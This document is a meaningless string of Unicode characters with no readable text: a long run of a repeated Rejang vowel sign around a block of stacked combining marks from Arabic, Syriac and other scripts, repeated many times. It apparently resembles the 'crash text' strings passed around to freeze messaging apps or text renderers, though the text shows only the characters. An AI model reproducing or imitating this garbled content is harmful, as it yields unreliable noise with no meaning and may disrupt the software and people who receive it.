ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ